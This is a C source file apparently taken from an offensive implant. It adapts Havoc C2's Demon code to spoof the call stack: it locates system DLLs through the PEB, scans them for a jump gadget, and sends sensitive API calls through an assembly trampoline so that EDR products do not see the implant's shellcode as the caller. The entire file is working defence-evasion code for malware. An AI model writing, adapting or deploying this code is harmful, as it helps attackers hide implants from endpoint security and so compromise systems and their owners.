/**
 * stack_spoof.c — Gadget-based return address / call stack spoofing
 *
 * Borrowed and adapted from HavocFramework/Havoc (MIT licence)
 * Source: payloads/Demon/src/core/Spoof.c + src/asm/Spoof.x64.asm
 *
 * Problem this solves:
 *   Modern EDRs (CrowdStrike Falcon, SentinelOne, Defender ATP) walk the
 *   thread call stack when a suspicious API is called. If the stack shows
 *   an unbacked memory region (our implant's shellcode) as the caller,
 *   the EDR triggers an alert.
 *
 * How it works:
 *   1. Find a `jmp [r11]` gadget inside a system DLL that is already
 *      loaded in the process (ntdll, kernelbase, kernel32).
 *   2. The Spoof() trampoline (stack_spoof.x64.asm) overwrites the return
 *      address on the stack with the gadget address and saves the real
 *      return address in a PRM struct.
 *   3. When the called function returns, it jumps through the gadget which
 *      redirects to our `fixup` label, which restores everything.
 *   4. The call stack during the sensitive call shows only system DLL frames.
 *
 * MITRE: T1036 (Masquerading), T1055 (Process Injection)
 */

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>

/* ── PRM struct — must match layout expected by stack_spoof.x64.asm ─────── */
typedef struct _PRM {
    PVOID Trampoline;  /* [+0]  gadget / fixup addr */
    PVOID Function;    /* [+8]  real target function / saved return addr */
    PVOID Rbx;         /* [+16] saved rbx */
} PRM, *PPRM;

/* declared in stack_spoof.x64.asm */
extern PVOID Spoof(PVOID a, PVOID b, PVOID c, PVOID d, PPRM Param,
                   PVOID reserved, PVOID e, PVOID f, PVOID g, PVOID h);

/* ── Gadget finder ───────────────────────────────────────────────────────── */

/* Pattern: FF 23  (jmp [rbx] / jmp [r11] in x64 encoding) */
static const BYTE GADGET_PATTERN[] = { 0xFF, 0x23 };

/* Minimum gap from module start before scanning (skip PE headers) */
#define LDR_GADGET_HEADER_SIZE  0x1000

static PVOID _find_gadget(PVOID module_base, SIZE_T module_size)
{
    if (!module_base || module_size < LDR_GADGET_HEADER_SIZE)
        return NULL;

    BYTE *start = (BYTE *)module_base + LDR_GADGET_HEADER_SIZE;
    SIZE_T scan_size = module_size - LDR_GADGET_HEADER_SIZE - 1;

    for (SIZE_T i = 0; i < scan_size; i++) {
        if (start[i]   == GADGET_PATTERN[0] &&
            start[i+1] == GADGET_PATTERN[1])
            return (PVOID)(start + i);
    }
    return NULL;
}

/* ── Module size from PE headers ─────────────────────────────────────────── */

static SIZE_T _module_size(PVOID base)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
    return nt->OptionalHeader.SizeOfImage;
}

/* ── Module base from PEB (no API calls) ─────────────────────────────────── */

static PVOID _get_module_base(const wchar_t *dll_name)
{
    PPEB Peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY Head = &Peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = Head->Flink; e != Head; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(
            e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        UNICODE_STRING *name = &Entry->FullDllName;
        /* simple suffix match */
        SIZE_T nl = wcslen(dll_name);
        SIZE_T el = name->Length / 2;
        if (el >= nl) {
            const wchar_t *tail = &name->Buffer[el - nl];
            bool match = true;
            for (SIZE_T i = 0; i < nl && match; i++)
                if ((tail[i] | 0x20) != (dll_name[i] | 0x20)) match = false;
            if (match) return Entry->DllBase;
        }
    }
    return NULL;
}

/* ── Cached gadget ───────────────────────────────────────────────────────── */

typedef struct {
    PVOID Gadget;
    SIZE_T ModuleSize;
    PVOID ModuleBase;
    bool  Ready;
} SPOOF_CTX;

static SPOOF_CTX g_Spoof = { 0 };

bool SpoofInit(void)
{
    if (g_Spoof.Ready) return true;

    /* Try ntdll first, then kernelbase */
    const wchar_t *candidates[] = {
        L"ntdll.dll", L"kernelbase.dll", L"kernel32.dll", NULL
    };

    for (int i = 0; candidates[i]; i++) {
        PVOID base = _get_module_base(candidates[i]);
        if (!base) continue;
        SIZE_T sz = _module_size(base);
        PVOID gadget = _find_gadget(base, sz);
        if (gadget) {
            g_Spoof.Gadget     = gadget;
            g_Spoof.ModuleBase = base;
            g_Spoof.ModuleSize = sz;
            g_Spoof.Ready      = true;
            return true;
        }
    }
    return false;
}

/* ── Public spoofed-call wrapper ─────────────────────────────────────────── */

/**
 * SpoofCall — call Function(a,b,c,d,e,f,g,h) with a spoofed call stack.
 *
 * During the call, the stack shows a system DLL gadget as the return
 * address rather than the implant's code.  Supports up to 8 arguments.
 * For more arguments, extend the Spoof ASM trampoline.
 */
PVOID SpoofCall(PVOID Function,
                PVOID a, PVOID b, PVOID c, PVOID d,
                PVOID e, PVOID f, PVOID g, PVOID h)
{
    if (!g_Spoof.Ready && !SpoofInit()) {
        /* fallback: direct call without spoofing */
        return ((PVOID(*)(PVOID,PVOID,PVOID,PVOID,PVOID,PVOID,PVOID,PVOID))Function)
               (a,b,c,d,e,f,g,h);
    }

    PRM param = {
        .Trampoline = g_Spoof.Gadget,
        .Function   = Function,
        .Rbx        = NULL,
    };

    return Spoof(a, b, c, d, &param, NULL, e, f, g, h);
}

/*
 * Callers should use ISysNt*() wrappers from indirect_syscall.c for all
 * sensitive NT calls — those combine indirect syscall + can be paired with
 * SpoofCall() as needed. No typed Win32 wrappers needed here.
 */
